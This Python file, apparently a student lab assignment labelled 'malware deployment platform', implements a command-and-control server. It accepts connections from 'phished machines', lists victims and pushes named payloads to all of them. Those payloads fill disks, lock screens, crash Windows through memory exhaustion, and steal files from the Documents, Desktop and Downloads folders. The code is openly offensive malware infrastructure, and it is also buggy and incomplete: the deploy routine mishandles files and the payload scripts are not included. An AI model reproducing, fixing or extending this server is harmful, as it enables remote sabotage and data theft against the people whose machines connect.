# Host Installer
# Caleb Millard
# Lab 6 CMPT 360
# Title: malware deployment platform
# Dr. Rick Sutcliffe
# Program 1/2
import socket
import os


H = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s = socket.socket()
connected_clients = []
all_connections = []
all_address = []




# activates the server to listen for phished machines
def activateHomeBase():
    create_socket()
    bind_socket()
    accepting_connections()




# reserves are creates an open socket to be accessed
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9898
        s = socket.socket()


    except socket.error as msg:
        print("Socket creation error: " + str(msg))




# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))


        s.bind((host, port))
        s.listen(5)


    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()




# closes all current connections on port and socket then closes.
def accepting_connections():
    for c in all_connections:
        c.close()


    del all_connections[:]
    del all_address[:]


    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout


            all_connections.append(conn)
            all_address.append(address)


            print("Connection has been established :" + address[0])


        except:
            print("Error not connected")




#
# connects to the hosted server
#




def deployPayload(payloadName):
    try:
        file = payloadName
        fileSize = os.path.getsize(payloadName)
        s.send(file.encode())
        s.send(str(fileSize).encode())
        Data = file.read()
        s.sendall(Data)


    except:
        print("payload failed to deploy")




def __main__():
    print("Welcome to the HomeBase of BaseCamp:")
    print("Activate the server to start allowing incoming targets")


    while True:
        print("--------------------------------------------")
        print("1: List all currently connected Devices")
        print("2: Activate the HomeBase Server")
        print("3: Select payload")
        print("4: Load payloads to be referenced and deployed")
        print("5: Deploy payloads to all connected devices")
        print("6: close Homebase Server")
        print("--------------------------------------------")
        selection = input("Enter your selection: ")
        print("you have selected: " + selection)


        if selection == "1":
            print("--------------------------------------------")
            results = ""
            for i, H in enumerate(all_connections):
                try:
                    H.send(str.encode(" "))
                    H.recv(201480)
                except:
                    del all_connections[i]
                    del all_address[i]
                    print("NO CONNECTIONS")
                    continue
                results = (
                    str(i)
                    + " "
                    + str(all_address[i][0] + " " + str(all_address[i][0] + "\n"))
                )
                print("--connected clients--" + "\n" + results)
            print("--------------------------------------------")
        elif selection == "2":
            # activates the homebase server locally, on port 9897
            activateHomeBase()
            print("")
        elif selection == "3":
            # UI for selecting which payload
            print("--------------------------------------------")
            print(
                "1 : space_fill : fill up the targets hard drive with thousands of files."
            )
            print(" ")
            print(
                "2 : matrix : repeatedly fills the users screen with matrix like text preventing use of the device."
            )
            print(" ")
            print(
                "3 : windows_crash : targets common windows applications and duplicates them until the memory is filled and crashes"
            )
            print(" ")
            print(
                "4 : contain : steals all the files from documents desktop and downloads"
            )
            print("--------------------------------------------")
            payloadinput = input("Select number for payload: ")
            if payloadinput == "1":
                print("space_fill has been selected")
            elif payloadinput == "2":
                print("matrix has been selected")
            elif payloadinput == "3":
                print("windows_Crash has been selected")
            elif payloadinput == "4":
                print("contain has been selected")
        elif selection == "4":
            # still needs to actually load the files into the application
            print("--------------------------------------------")
            print("loading...")
            contain = "contain.bat"
            spacefill = "spacefill.bat"
            matrix = "matrix.bat"
            crash = "windowspam.bat"
            print("loading Complete")
            print("--------------------------------------------")
        elif selection == "5":
            # deploys the payloads to any connected clients
            if payloadinput == "1":
                deployPayload(spacefill)
                print(" ")
            elif payloadinput == "2":
                deployPayload(matrix)
                print(" ")
            elif payloadinput == "3":
                deployPayload(crash)
                print(" ")
            elif payloadinput == "4":
                deployPayload(contain)
                print(" ")
            else:
                # use default number 1
                deployPayload(spacefill)
        elif selection == "6":
            s.close()




__main__()


